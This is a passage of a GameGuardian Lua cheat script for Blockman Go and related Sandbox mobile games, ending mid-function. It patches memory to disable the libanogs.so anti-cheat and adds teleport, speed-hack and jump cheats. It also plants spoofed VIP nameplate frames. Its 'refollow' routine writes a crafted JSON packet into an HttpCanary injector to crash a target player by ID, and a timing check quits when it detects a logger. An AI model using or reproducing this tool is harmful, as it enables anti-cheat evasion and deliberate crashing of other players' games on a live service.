Main10['View']={address=MainUI['Wizard13'].address+0x34,flags=4,freeze=true,value=0}
MainUI['AutoClicker']={address=MainUI['Wizard13'].address+0x48,flags=4,freeze=true,value=1}
MainUI['PCValue']={address=MainUI['Wizard13'].address-394,flags=1,freeze=true,value=1}
Main10.AutoRun={address=MainUI['Wizard13'].address+0x44,flags=1,freeze=true,value=0}
MainUI['MoveState']={address=MainUI['Wizard13'].address+0x1C,flags=4,freeze=true,value=2}
Main10['Menu']={address=UI4[1].address+0xA18+raznica,flags=1}
end
gg.showUiButton()
getMainXa=1488
function MainXa(type,offset,edit)if not getMainXa then gg.clearResults()gg.clearList()gg.setRanges(16384 | 8)gg.searchNumber(1.62,16)getMainXa=gg.getResults(1)[1].address gg.clearResults()end gg.addListItems({{address=getMainXa+offset,flags=type,freeze=true,value=edit}})gg.clearList()end
function packetsApk()
if c10 == 0 then
targetPkg = 'com.sandboxol.blockymods'
elseif c10 == 1 then
targetPkg = 'com.sandboxol.indiegame.buildandshoot'
elseif c10 == 2 then
targetPkg = 'com.sandboxol.indiegame.eggwars'
elseif c10 == 3 then
targetPkg = 'com.sandboxol.indiegame.bedwar'
elseif c10 == 4 then
targetPkg = 'com.sandboxol.indiegame.skywar'
elseif c10 == 5 then
targetPkg = 'com.sandboxol.indiegame.herotycoon'
elseif c10 == 6 then
targetPkg = 'com.sandboxol.indiegame.jailbreak'
elseif c10 == 7 then
targetPkg = 'com.sandboxol.indiegame.skyblock'
elseif c10 == 8 then
targetPkg = 'com.sandboxol.indiegame.hideandseek'
elseif c10 == 9 then
targetPkg = 'com.sandboxol.indiegame.buildbattle'
elseif c10 == 10 then
targetPkg = 'com.sandboxol.indiegame.survivalgames'
elseif c10 == 11 then
targetPkg = 'com.sandboxol.indiegame.g1017'
elseif c10 == 12 then
targetPkg = 'com.sandboxol.indiegame.luckyblock'
elseif c10 == 13 then
targetPkg = 'com.sandboxol.indiegame.g1030'
elseif c10 == 14 then
targetPkg = 'com.sandboxol.indiegame.g1009'
elseif c10 == 15 then
targetPkg = 'com.sandboxol.indiegame.g1019'
elseif c10 == 16 then
targetPkg = 'com.sandboxol.indiegame.g1047'
elseif c10 == 17 then
targetPkg = 'com.sandboxol.indiegame.g1015'
elseif c10 == 18 then
targetPkg = 'com.sandboxol.indiegame.g1055'
elseif c10 == 19 then
targetPkg = 'com.sandboxol.indiegame.g2052'
elseif c10 == 20 then
targetPkg = 'com.sandboxol.indiegame.g1036'
elseif c10 == 21 then
targetPkg = 'com.sandboxol.indiegame.g1010'
elseif c10 == 22 then
targetPkg = 'com.sandboxol.indiegame.amosCraft'
elseif c10 == 23 then
targetPkg = 'com.sandboxol.indiegame.g1016'
elseif c10 == 24 then
targetPkg = 'com.sandboxol.indiegame.g1051'
elseif c10 == 25 then
targetPkg = 'com.sandboxol.indiegame.g1028'
elseif c10 == 26 then
targetPkg = 'com.sandboxol.indiegame.g1029'
elseif c10 == 27 then
targetPkg = 'com.sandboxol.indiegame.g1024'
elseif c10 == 28 then
targetPkg = 'com.sandboxol.indiegame.g1026'
elseif c10 == 29 then
targetPkg = 'com.sandboxol.blockymods.vn'
elseif c10 == 30 then
targetPkg = 'com.sandboxol.blockymods.official'
end
end
myPkg = gg.getTargetInfo().packageName
c10 = 0
for i = 1,31 do
packetsApk()
if targetPkg == myPkg then
c11 = true
break
else
c10 = c10 + 1
end
end

function changeG10()
function wzrd1488(path,content)local wzrd=io.open(path,'w')if wzrd then wzrd:write(content)wzrd:close() end end

function game()
gg.setVisible(false)gg.clearResults()gg.clearList()gameType = gg.prompt({"🔸Пример: если игра имеет код g1026, то нужно ввести в скрипт 26\n\n~Код игры:"},{''},{'number'})if gameType then a = tonumber(gameType[1])b = string.len(gameType[1])if not a or b ~= 2 then gg.alert('❗Код игры должен содержать только две цифры','')os.exit()end gg.setVisible(false)gg.setRanges(2)gg.searchNumber(':g10',1)gg.refineNumber(':g',1)t=gg.getResults(99999)gg.clearResults()for w=1,#t do t[w].address=t[w].address-1 end gg.loadResults(t)gg.refineNumber(5,1)t=gg.getResults(1)[1].address gg.clearResults()gg.searchNumber(':g10'..UTF_8(gg.getValues({{address=t+4,flags=1},{address=t+5,flags=1}})),1)gg.getResults(99999)gg.editAll(':g10'..gameType[1],1)gg.clearResults()end
end
function refollow()
gg.setVisible(false)
t=gg.prompt({'ID For Crash'},{''},{'number'})
if t and tonumber(t[1],10) then
nick='Wizard1488'
t='{"gameId":"cumt2ajgasc631s0kdu0","country":"RU","targetId":'..t[1]..',"appVer":"5212","isPrivate":false,"rid":8013,"userId":64928,"roomAddr":"10.210.9.21:9911","picUrl":"http://staticgs.sandboxol.com/sandbox/avatar/1688310252972433.jpg","ever":10110,"name":"&$[ff0000ff-ff5500ff-ffff00ff-ff00ffff-0000ffff-00ffffff-55ffffff]$vse.taki.wizard$&[S=vip_nameplate_10_plus.json]\n[S=frame_gold_shine_ACW.json]","packageName":"bedwar","lang":"ru"}'
wzrd1488('/data/user/0/com.guoshi.httpcanary/injectors/1750216227247',t)end
end
function follow()
gg.setVisible(false)gg.setRanges(gg.REGION_OTHER)gg.searchNumber(':v1/dispatch',1)gg.getResults(99999)gg.editAll(':v1/follow##',1)gg.clearResults()
end
function menu()
t=gg.choice({'code id','code follow','code follow2','exit'})
if t then
if t==1 then
game()
elseif t==2 then
follow()
elseif t==3 then
refollow()
elseif t==4 then
os.exit()
end
end
end

while true do
if gg.isVisible(true) then gg.setVisible(false) menu() end
end
end
function delBlocks(st)
if not gtblo then
gg.clearResults()
gg.setRanges(16384 | 8)gg.searchNumber(-6215394106681132090,32)gtblo=gg.getResults(1)[1].address gg.clearResults()
end
if st then
blocksst=true
else
blocksst=false
tsp.blst={address=gtblo+96,flags=16,freeze=true,value='-3.47665818e10'}
end
end

function AntiCrash()
gg.setRanges(16384 | 8)gg.addListItems({{address=gg.getRangesList('libanogs.so')[1].start+3190800,flags=64,freeze=true,value=0}})gg.clearList()
end

if c11 then
gg.setVisible(false)
pkgC2 = gg.getTargetInfo().cmdLine
if not string.find(pkgC2, ':') then
AntiCrash()
if ANTIC1 then
gg.alert('𝘼𝙣𝙩𝙞-𝙘𝙧𝙖𝙨𝙝 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙨𝙪𝙘𝙘𝙚𝙨𝙨 𝙪𝙨𝙚𝙙 𝙤𝙣 𝙩𝙝𝙚 𝙥𝙧𝙤𝙘𝙚𝙨𝙨: '..gg.getTargetInfo().label..'\n𝙉𝙤𝙬 𝙩𝙤 𝙥𝙡𝙖𝙮 𝙬𝙞𝙩𝙝 𝙩𝙝𝙚 𝙨𝙘𝙧𝙞𝙥𝙩, 𝙨𝙚𝙡𝙚𝙘𝙩 𝙩𝙝𝙚 𝙥𝙧𝙤𝙘𝙚𝙨𝙨: '..gg.getTargetInfo().label..' (BlockmanGo)','')
changeG10()
else
--[[gg.alert('𝙏𝙝𝙚 𝙬𝙧𝙤𝙣𝙜 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙞𝙨 𝙨𝙚𝙡𝙚𝙘𝙩𝙚𝙙!\n𝙔𝙤𝙪 𝙣𝙚𝙚𝙙 𝙩𝙤 𝙘𝙝𝙤𝙤𝙨𝙚 𝙖 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙬𝙝𝙚𝙧𝙚 𝙩𝙝𝙚𝙧𝙚 𝙞𝙨: (𝘽𝙡𝙤𝙘𝙠𝙢𝙖𝙣𝙂𝙤)\n𝙄𝙣 𝙮𝙤𝙪𝙧 𝙘𝙖𝙨𝙚, 𝙮𝙤𝙪 𝙣𝙚𝙚𝙙 𝙩𝙤 𝙘𝙝𝙤𝙤𝙨𝙚: '..gg.getTargetInfo().label..' (BlockmanGo)','')]]
changeG10()
end
elseif not string.find(pkgC2, ':BlockmanGo') then
gg.alert('Выбран неправильный процесс!\nНадо выбрать процесс, где есть: (BlockmanGo)\nВ твоём случае надо выбрать: '..gg.getTargetInfo().label..' (BlockmanGo)','')
else
AntiCrash()
gg.setVisible(false)
gg.clearResults()
gg.clearList()
a = os.time()
spam = 'bruh'
spam = spam:rep(9)
for i = 1,2000 do
gg.refineNumber(spam)
end
b = os.time()
v = b - a
if v >= 5 then
gg.alert('⣸⠒⠠⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⡇⠀⠀⠀⠑⠄⡀⠀⠀⠀⣀⠀⠀⠀\n⠃⠀⠀⠀⠀⠀⢈⣵⣦⢸⣿⡧⠀⠀\n⠀⠀⠀⠀⠀⠀⣼⣿⣿⣾⢏⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⢿⣼⣿⢟⣷⣷⣆⠀\n⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡿⠈⢆\n⠀⠀⠀⠀⠀⢰⢸⣿⣿⣿⣿⠇⠀⠈\n⠀⠀⠀⠀⠀⢸⢸⣿⣿⣿⡇      logger detected 🤡⠀⠀⠀\n⠀⠀⠀⠀⠀⡈⣼⣿⣿⣿⡇⠀⠀⠀\n⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡇⠀⠀⠀\n⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⠀⠀⠀\n⠀⠀⠀⠾⢿⣿⣿⠿⠿⣿⡿\n','')
os.exit()
end
if C_ALLOC()==0 then wzrdrg=gg.REGION_OTHER else wzrdrg=4 end
function Checker100()
gg.setVisible(false)
gg.clearResults()
gg.clearList()
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)
gg.searchNumber(':assets/resources',1)
gg.refineNumber(':a',1)
t = gg.getResults(1488)gg.clearResults()
for i=1,#t do t[i].address=t[i].address+0x237 t[i].flags=4 end gg.loadResults(t)gg.refineNumber(999,4)t={{address=gg.getResults(1)[1].address-0x237,flags=1}}gg.clearResults()gg.loadResults(t)
Main10.gg11={address=t[1].address-0x1de,flags=1,freeze=true,value=1}
Main10.Port={address=t[1].address-0x131,flags=4}
list,access1488={},{}
for i=1,30 do
local p=gg.getValues({{address=t[1].address-0x151+i,flags=1},{address=t[1].address+0x8f+i,flags=1}})
if p[1].value~=0 or p[2].value~=0 then
if p[1].value~=0 then
list[i]={address=t[1].address-0x151+i,flags=1}
end
if p[2].value~=0 then
access1488[i]={address=t[1].address+0x8f+i,flags=1}
end
else
break
end
end
list=gg.getValues(list)
if #list~=0 then
--IpServer=UTF_8(list)
IpServer='nil'
else
IpServer='nil'
end
access1488=gg.getValues(access1488)
if #access1488~=0 then
--access1488=UTF_8(access1488)
access1488='nil'
else
access1488='nil'
end
list=gg.getValues({{address=t[1].address-0x120,flags=1},{address=t[1].address-0x11F,flags=1},{address=t[1].address-0x11D,flags=1},{address=t[1].address-0x11C,flags=1}})
if list[1].value+list[2].value+list[3].value+list[4].value==398 then
eng1=nil
else
eng1=nil
end
list=nil
tgg177 = gg.getResults(1)
gg.clearResults()
gg.searchNumber('16842752~16842753', 4,_, gg.SIGN_EQUAL, t[1].address + -4000, t[1].address + 4000)
j = gg.getResultsCount()
if j == 0 then
gg.searchNumber(65537, 4,_, gg.SIGN_EQUAL, t[1].address + -4000, t[1].address + 4000)
end
g = gg.getResults(1)
if #g~=0 then
list={}
for i=1,70 do
list[i]={address=g[1].address+0x48+i,flags=1}
end
list=gg.getValues(list)
usernickname=UTF_8(list)
else
usernickname='nil'
end
gg.clearResults()
gg.searchNumber('1;2;10100~10300;1;50~200::21',4,_,_,t[1].address+-100000,t[1].address+100000)
gg.refineNumber('10100~10300',4)
if gg.getResultsCount()~=0 then
EngineVersion=gg.getValues({{address=gg.getResults(1)[1].address,flags=4}})[1].value
else
EngineVersion='10111'
--"receiving fail"
end
gg.clearResults()
gg.searchNumber(':g10', 1,_, gg.SIGN_EQUAL, t[1].address + -4000, t[1].address + 4000)
if gg.getResultsCount()==0 then
gg.searchNumber(':g11', 1,_, gg.SIGN_EQUAL, t[1].address + -4000, t[1].address + 4000)
gg.refineNumber(':g1',1)
end
gg.refineNumber(':1',1)
gameTypeR = gg.getResults(2)
gameType = {gameTypeR[1]}
gameTypeR = {gameTypeR[2]}
gg.clearResults()
gg.searchNumber(':m1', 1,_, gg.SIGN_EQUAL, t[1].address + -4000, t[1].address + 4000)
gg.refineNumber(':m',1)
gameMap = gg.getResults(1)
if #gameMap==0 then
gg.clearResults()
gg.searchNumber(':m9', 1,_, gg.SIGN_EQUAL, t[1].address + -4000, t[1].address + 4000)
gg.refineNumber(':m',1)
gameMap = gg.getResults(1)
if #gameMap==0 then
gg.clearResults()
gg.searchNumber(':m7', 1,_, gg.SIGN_EQUAL, t[1].address + -4000, t[1].address + 4000)
gg.refineNumber(':m',1)
gameMap = gg.getResults(1)
if #gameMap==0 then
gg.clearResults()
gg.searchNumber(':m3', 1,_, gg.SIGN_EQUAL, t[1].address + -4000, t[1].address + 4000)
gg.refineNumber(':m',1)
gameMap = gg.getResults(1)
end
end
end
gg.clearResults()
gg.searchNumber('30~60', 4,_, gg.SIGN_EQUAL, t[1].address + -4000, t[1].address + 4000)
fpsUnlock = gg.getResults(75766)
gg.clearResults()
for i,v in pairs(fpsUnlock) do
v.address = v.address + 4
end
gg.loadResults(fpsUnlock)
gg.refineNumber('16~33')
ttt = gg.getResults(1337)
if #ttt~=0 then
fpsUnlock={{address=ttt[1].address,flags=4,freeze=true,value=0}}
gg.addListItems(fpsUnlock)
gg.clearList()
else
fpsUnlock={}
end
gg.clearResults()
gg.searchNumber('1~10;1~100000D;0~1B::9', 16,_, gg.SIGN_EQUAL, t[1].address + -4000, t[1].address + 0)gg.refineNumber('1~10',16)c=0
if gg.getResultsCount()>1 then
c=gg.getResults(99999)gg.clearResults()
for i=1,#c do
c[i].address=c[i].address+0x518
c[i].flags=4
end
gg.loadResults(c)gg.refineNumber(999,4) c=0x518 end
c=gg.getResults(1)[1].address-c
gameReset2={{address=c-72,flags=1},{address=c+4,flags=4},{address=c+0x140,flags=4}}
gg.clearResults()
gg.setRanges(8 | 16 | 262144 | 32)
gg.searchNumber(257,4)wa=gg.getResults(82828)gg.clearResults()for i=1,#wa do wa[i].address=wa[i].address-16 wa[i].flags=16 end gg.loadResults(wa)gg.refineNumber(10,16)if gg.getResultsCount()~=0 then speedhax={address=gg.getResults(1)[1].address-12,flags=4,freeze=true,value=-1} end
gg.clearResults()getGameType()
end


function getGameName()
BedWarGame = nil
SkyBlockGame=nil
BASGame=nil
if myGameType == '1001' then
gameName = 'Hunger Games'
elseif myGameType == '1002' then
gameName = 'Sky War'
elseif myGameType == '1007' then
gameName = 'Bow Spleef'
elseif myGameType == '1008' then
gameName = 'Bed War (4v4v4v4)'
BedWarGame = true
elseif myGameType == '901' then
gameName = 'Murder Mystery'
elseif myGameType == '1010' then
gameName = 'Tnt Run'
elseif myGameType == '1011' then
gameName = 'SnowBall Battle'
elseif myGameType == '1013' then
gameName = 'Zombie Infecting'
elseif myGameType == '1401' then
gameName = 'Jail Break'
elseif myGameType == '1015' then
gameName = 'Treasure Hunter'
elseif myGameType == '1016' then
gameName = 'PUBG'
elseif myGameType == '1017' then
gameName = 'Hide And Seek'
elseif myGameType == '1018' then
gameName = 'Egg War'
elseif myGameType == '1019' then
gameName = 'Aliens Attack'
elseif myGameType == '1020' then
gameName = 'Mini Town'
elseif myGameType == '1021' then
gameName = 'Rainbow parkour'
elseif myGameType == '1022' then
gameName = 'Capture The Flag'
elseif myGameType == '1023' then
gameName = 'Build Battle'
elseif myGameType == '1024' then
gameName = 'Gem Knight'
elseif myGameType == '1025' then
gameName = 'Hero Tycoon 2'
elseif myGameType == '1026' then
gameName = 'Tnt Tag'
elseif myGameType == '1027' then
gameName = 'Sky Royale'
elseif myGameType == '1028' then
gameName = 'Ultimate Fighting'
elseif myGameType == '1029' then
gameName = 'Mega Walls'
elseif myGameType == '1030' then
gameName = 'Snowman Defender'
elseif myGameType == '1031' then
gameName = 'Ranchers'
elseif myGameType == '1032' then
gameName = 'Blockman Strike (Lobby)'
elseif myGameType == '1033' then
gameName = 'Blockman Strike'
elseif myGameType == '1036' then
gameName = 'Ender Vs Slender'
elseif myGameType == '1037' then
gameName = 'Hide And Seek 2 (Lobby)'
elseif myGameType == '1038' then
gameName = 'Hide And Seek 2'
elseif myGameType == '1039' then
gameName = 'Hide And Seek 2'
elseif myGameType == '1041' then
gameName = 'Bird Simulator'
elseif myGameType == '1042' then
gameName = 'Build And Shoot (Lobby)'
BASGame=true
elseif myGameType == '1043' then
gameName = 'Build And Shoot (Team Battle)'
BASGame=true
elseif myGameType == '1044' then
gameName = 'Build And Shoot (Solo Battle)'
BASGame=true
elseif myGameType == '1045' then
gameName = 'Build And Shoot (1v1)'
BASGame=true
elseif myGameType == '1046' then
gameName = 'Bed War (Lobby)'
BedWarGame = true
elseif myGameType == '1047' then
gameName = 'Realm City'
elseif myGameType == '1048' then
gameName = 'Sky Block (Island)'
SkyBlockGame=true
elseif myGameType == '1049' then
gameName = 'Sky Block (Mining)'
SkyBlockGame=true
elseif myGameType == '1050' then
gameName = 'Sky Block (Product)'
SkyBlockGame=true
elseif myGameType == '1051' then
gameName = 'Walking Dead'
elseif myGameType == '1052' then
gameName = 'Block Fort'
elseif myGameType == '1053' then
gameName = 'Battle Royale'
BASGame=true
elseif myGameType == '1054' then
gameName = 'Lucky Block Sky War'
elseif myGameType == '1055' then
gameName = 'WWE School Simulator'
WizardVal1488 = 1.62
wizardValType = 16
elseif myGameType == '1056' then
gameName = 'Angry Pets'
elseif myGameType == '1057' then
gameName = 'Angry Pets'
elseif myGameType == '1058' then
gameName = 'Lucky Blocks'
elseif myGameType == '1061' then
gameName = 'Bed War (Solo)'
BedWarGame = true
elseif myGameType == '1062' then
gameName = 'Bed War (Double)'
BedWarGame = true
elseif myGameType == '1063' then
gameName = 'Bed War (Training)'
BedWarGame = true
elseif myGameType == '1064' then
gameName = 'Bullets Fly'
elseif myGameType == '1065' then
gameName = 'Bed War (10v10)'
BedWarGame = true
elseif myGameType == '1066' then
gameName = 'Sky Block (Event)'
SkyBlockGame = true
elseif myGameType == '1071' then
gameName = 'Clan War'
elseif myGameType == '1100' then
gameName = 'game room'
else
if not myGameType then
myGameType='not known'
gameName='not known'
else
gameName = 'g'..myGameType
end
end
end


function getGameName2(name)
name=name:gsub('g','')
if name == '1001' then
t = 'Hunger Games'
elseif name == '1002' then
t = 'Sky War'
elseif name == '1007' then
t = 'Bow Spleef'
elseif name == '1008' then
t = 'Bed War (4v4v4v4)'
elseif name == '901' then
t = 'Murder Mystery'
elseif name == '1010' then
t = 'Tnt Run'
elseif name == '1011' then
t = 'SnowBall Battle'
elseif name == '1013' then
t = 'Zombie Infecting'
elseif name == '1401' then
t = 'Jail Break'
elseif name == '1015' then
t = 'Treasure Hunter'
elseif name == '1016' then
t = 'PUBG'
elseif name == '1017' then
t = 'Hide And Seek'
elseif name == '1018' then
t = 'Egg War'
elseif name == '1019' then
t = 'Aliens Attack'
elseif name == '1020' then
t = 'Mini Town'
elseif name == '1021' then
t = 'Rainbow parkour'
elseif name == '1022' then
t = 'Capture The Flag'
elseif name == '1023' then
t = 'Build Battle'
elseif name == '1024' then
t = 'Gem Knight'
elseif name == '1025' then
t = 'Hero Tycoon 2'
elseif name == '1026' then
t = 'Tnt Tag'
elseif name == '1027' then
t = 'Sky Royale'
elseif name == '1028' then
t = 'Ultimate Fighting'
elseif name == '1029' then
t = 'Mega Walls'
elseif name == '1030' then
t = 'Snowman Defender'
elseif name == '1031' then
t = 'Ranchers'
elseif name == '1032' then
t = 'Blockman Strike (Lobby)'
elseif name == '1033' then
t = 'Blockman Strike'
elseif name == '1036' then
t = 'Ender Vs Slender'
elseif name == '1037' then
t = 'Hide And Seek 2 (Lobby)'
elseif name == '1038' then
t = 'Hide And Seek 2'
elseif name == '1039' then
t = 'Hide And Seek 2'
elseif name == '1041' then
t = 'Bird Simulator'
elseif name == '1042' then
t = 'Build And Shoot (Lobby)'
elseif name == '1043' then
t = 'Build And Shoot (Team Battle)'
elseif name == '1044' then
t = 'Build And Shoot (Solo Battle)'
elseif name == '1045' then
t = 'Build And Shoot (1v1)'
elseif name == '1046' then
t = 'Bed War (Lobby)'
elseif name == '1047' then
t = 'Realm City'
elseif name == '1048' then
t = 'Sky Block (Island)'
elseif name == '1049' then
t = 'Sky Block (Mining)'
elseif name == '1050' then
t = 'Sky Block (Product)'
elseif name == '1051' then
t = 'Walking Dead'
elseif name == '1052' then
t = 'Block Fort'
elseif name == '1053' then
t = 'Battle Royale'
elseif name == '1054' then
t = 'Lucky Block Sky War'
elseif name == '1055' then
t = 'WWE School Simulator'
elseif name == '1056' then
t = 'Angry Pets'
elseif name == '1057' then
t = 'Angry Pets'
elseif name == '1058' then
t = 'Lucky Blocks'
elseif name == '1061' then
t = 'Bed War (Solo)'
elseif name == '1062' then
t = 'Bed War (Double)'
elseif name == '1063' then
t = 'Bed War (Training)'
elseif name == '1064' then
t = 'Bullets Fly'
elseif name == '1065' then
t = 'Bed War (10v10)'
elseif name == '1066' then
t = 'Sky Block (Event)'
elseif name == '1071' then
t = 'Clan War'
elseif name == '1100' then
t = 'game room'
else
t='g'..name
end
return t end

function getGameType()
--[[myGameType = {}
b = gg.getValues(gameType)
for i = 1,4 do
a = gg.getValues(b)
for i,v in pairs(b) do
v.address = v.address + 1
end
g = string.char(a[1].value)
table.insert(myGameType, g)
end
myGameType = table.concat(myGameType)]]
getGameMap()
getGameName()
end

function getGameMap()
if #gameMap==0 then
myMap='nil'
do return end
end
myMap = {}
for i=1,20 do
table.insert(myMap,{address=gameMap[1].address+i-1,flags=1})
end
b,myMap=gg.getValues(myMap),{}
for i = 1,20 do
if b[i].value < 1 then
break
end
table.insert(myMap,string.char(b[i].value))
end
myMap = table.concat(myMap)
myGameType=string.sub(myMap,2,5)
end

function OldClientChecker()
if not IsLife then
values()
end
gg.clearResults()
gg.clearList()
gg.loadResults(Mag2)
gg.getResults(99999)
gg.refineNumber('64~66',1)
client = gg.getResultsCount()
if client == 0 then
getJumpSet = nil
IsLife = false
animFreezeDa = false
getAnim1337 = false
values()
end
gg.clearResults()
gg.clearList()
gg.loadResults(Mag1)
gg.getResults(99999)
gg.refineNumber(WizardVal1488,wizardValType)
Mag1 = gg.getResults(99999)
gg.clearResults()
gg.clearList()
gg.addListItems(Mag1)
t = gg.getListItems()
gg.clearList()
gg.clearResults()
end

function addRamka()
k=gg.prompt({'change nick for msg'},{'vse.taki.wizard[S=nameplate_test.json]'},{'text'})
if k and k[1] then
if not nickramka then gg.setRanges(wzrdrg)gg.clearResults()gg.searchNumber(':.Blacklinco.[S=vip_nameplate_6.json]',1)gg.refineNumber(']',1)t=gg.getResults(1488) gg.clearResults()for i=1,#t do t[i].address=t[i].address+2 end gg.loadResults(t)gg.refineNumber('49~50',1)nickramka=gg.getResults(9999) end if #nickramka==0 then gg.alert('nil',1)else t=nickramka
sp=wzrd888(k[1])
print(t)wzrdramka=#sp
print(wzrdramka)
spisoknika={}
for b=1,#t do
for i=1,#sp do
spisoknika[#spisoknika+1]={address=(t[b].address-41)+i,flags=1,freeze=true,value=sp[i]}
end
end
end end
end
function changeRamka()
h=gg.choice({'Perfection','frame_gold_shine_ACW','frame_blue_shine_ACW','vip_entergame_011','levelup_frame_003','vip_pendant_004'})
if h==1 then
newramka="[S=Perfection.json]w"
elseif h==2 then
newramka="[S=frame_gold_shine_ACW.json]w"
elseif h==3 then
newramka="[S=frame_blue_shine_ACW.json]w"
elseif h==4 then
newramka="[S=vip_entergame_011.json]w"
elseif h==5 then
newramka="[S=levelup_frame_003.json]w"
elseif h==6 then
newramka="[S=vip_pendant_004.json]w"
end
end
function menuRamka()
j=gg.choice({'change ramka','add ramka'})
if j == 1 then
changeRamka()
elseif j==2 then
addRamka()
end

end

function clientChecker()
--[[if oldCheckerDa then
OldClientChecker()
else]]
if not IsLife then
values()
do return end
end
client = gg.getValues(Mag5)
if #client == 0 then
clientChecker()
do return end
else
if client[1].value ~= w60 then
getJumpSet = nil
animFreezeDa = false
getAnim1337 = false
IsLife = false
values()
end
t = gg.getValues(Mag1) return t
end
end
--end
en = 0

sr=gg.setRanges
sn=gg.searchNumber
gv=gg.getValues 
gr=gg.getResults 
gl=gg.getListItems 
cr=gg.clearResults
cl=gg.clearList
ad=gg.addListItems
sv=gg.setValues
V=gg.setVisible
T=gg.toast
iV=gg.isVisible
pr=gg.prompt
se=gg.SIGN_EQUAL
j=999999
Nd=0
V(false)


function Sv(v,rg,fg)rt={}gg.setRanges(rg)gg.searchNumber(v[1],fg)
local r=gg.getResults(999999)
   if #r==0 then return rt end 
   for iv=2,#v do 
      for i=1,#r do 
        r[i].address=r[i].address+v[iv][2]
      end 
       local rr=gg.getValues(r) 
        tt={}
         for i=1,#rr do 
            if rr[i].value==v[iv][1]
                    then ii=#tt+1
                    tt[ii]={}
                    tt[ii].address=rr[i].address-v[iv][2]
                    tt[ii].flags=fg
            end 
         end 
          if #tt==0 then return rt end 
           r=gg.getValues(tt)
            if iv==#v then rt=r 
                return rt
            end 
   end
  return rt 
end

function Teleport(x,y,z)
if x ~= 'null' then
tsp.x={address=Mag6[1].address-0xA8,flags=16,freeze=true,value=x}
tsp.x2={address=Mag6[1].address-0x9c,flags=16,freeze=true,value=x+0.6}
end
if y ~= 'null' then
tsp.y={address=Mag6[1].address-0xA4,flags=16,freeze=true,value=y}
tsp.y2={address=Mag6[1].address-0x98,flags=16,freeze=true,value=y+1.8}
end
if z ~= 'null' then
tsp.z={address=Mag6[1].address-0xA0,flags=16,freeze=true,value=z}
tsp.z2={address=Mag6[1].address-0x94,flags=16,freeze=true,value=z+0.6}
end
end

function Ge(quna1,quna2,quna3)
    for i,v in pairs(r) do
        local address=v.address
        x=gv({{address=address + quna1, flags = quna2}})[quna3].value
    end 
end

function Ed(quna1,quna2,quna3,quna4,quna5,quna6,quna7,quna8)
   if #r>0 then tt={}
      for i=1,#r do ii=#tt+1tt[ii]={}
        tt[ii].address = r[i].address+quna1 
        tt[ii].value = quna2 
        tt[ii].flags = quna3
        tt[ii].freeze = quna4
        tt[ii].name = quna5
      end 
       if quna6 == '0' then else if quna6 == '1' then gg.addListItems(tt)end end 
       if quna7 == '0' then else if quna7 == '1' then gg.setValues(tt)end end 
       if quna8 == '0' then else if quna8 == '1' then gg.clearList()end end 
    end
    cr()
end


function values()
if not IsLife then
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)
gg.searchNumber(WizardVal1488, wizardValType)
t = gg.getResults(1337)
gg.clearResults()
if #t == 0  then
values()
end
Mag5={}
for i,v in pairs(t) do
table.insert(Mag5,{address=v.address+0x244,flags=4})
end
gg.loadResults(Mag5)
gg.refineNumber(w60,4)
Mag5 = gg.getResults(1)
gg.clearResults()
t={{address=Mag5[1].address-0x244,flags=wizardValType}}
Mag1 = {t[1]}
Mag2 = {{address=t[1].address+0x138+7,flags=1}}
Mag3 = {t[1]}
Mag4 = {{address=t[1].address+0x138,flags=64}}
Mag6 = {t[1]}
PlayerClientStatus = {}
table.insert(PlayerClientStatus,Mag4[1])
table.insert(PlayerClientStatus,Mag5[1])
IsLife=true
end
end

function blink(on1)
if on1 then t,blinkStatus=0,true else t,blinkStatus=1,false end
tsp.blink={address=wizard089+4,flags=1,freeze=true,value=t}
end

function View()

gg.clearResults()
gg.clearList()
if not eng1 then
inputV1 = gg.prompt({
            "🔹Изʍᴇниᴛь ʙид『🔭』\n\nВведи значение:"
        }, {
            [1] = "1"
        })
        else
inputV1 = gg.prompt({
            "🔹Change View『🔭』\n\nEnter value"
        }, {
            [1] = "1"
        })
        end
        if inputV1 then
        onV1 = inputV1[1]:gsub(",", ".")
        if onV1 == "" then
        if not eng1 then
        gg.toast('Строка не может быть пуста❗')
        else
        gg.toast('String cannot empty❗')
        end
        else
         checknumV1 = tonumber(onV1)
        if checknumV1 == nil then
        if not eng1 then
  gg.toast('Обнаружены стороние символы. ВВОДИ ТОЛЬКО ЧИСЛА❗❗❗')
  else
  gg.toast('incompatible symbols detected. ENTER NUMBERS ONLY❗❗❗')
  end
else
        if onV1== 1 or 1.0 then
        OffEsli1 = 1
        end
        offV1=onV1 * 3
        gg.setVisible(false)
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)
gg.setVisible(false)
if not Val254 then
gg.searchNumber("4561245704485590794", 32)
gg.setVisible(false)
t = gg.getResults(99999)
gg.clearResults()
for i, v in pairs(t) do
    v.flags = 16
	v.address = v.address + 0xC4
	v.value = offV1
	v.freeze = true
	gg.addListItems(t)
	v254 = gg.getListItems()
end
gg.clearResults()
gg.clearList()
Val254 = true
else
for i,v in pairs(v254) do
	v.value = offV1
	v.freeze = true
	gg.addListItems(v254)
end
gg.clearResults()
gg.clearList()
end
if onV1 == "1" or onV1 == "1.0" then
MenuStatus2 = '🔴'
else
MenuStatus2 = '🟢x' .. onV1
end

end
end
else
gg.alert("Ты отменил")
end
end

function setAirSpeed(val)
val=val + 0.000998
val=val / 50
gg.setVisible(false)
clientChecker()
for i, v in pairs(t) do
    v.flags = 16
	v.address = v.address + 0x378
	v.value = val
	v.freeze = true
	gg.addListItems(t)
end
gg.clearResults()
gg.clearList()
end

function AirSpeed()
gg.clearResults()
gg.clearList()
if not eng1 then
input5 = gg.prompt({
            "🔹Дальность прыжка『💫』\n\nВведи значение:"
        }, {
            [1] = "1"
        })
        else
        input5 = gg.prompt({
            "🔹Range Jump『💫』\n\nEnter value:"
        }, {
            [1] = "1"
        })
        end
        if input5 then
        on2323 = input5[1]:gsub(",", ".")
        if on2323 == "" then
        if not eng1 then
        gg.toast('Строка не может быть пуста❗')
        else
        gg.toast('String cannot empty❗')
        end
        else
        if JetPackConfig then
on2323 = 20
end
         checknum = tonumber(on2323)
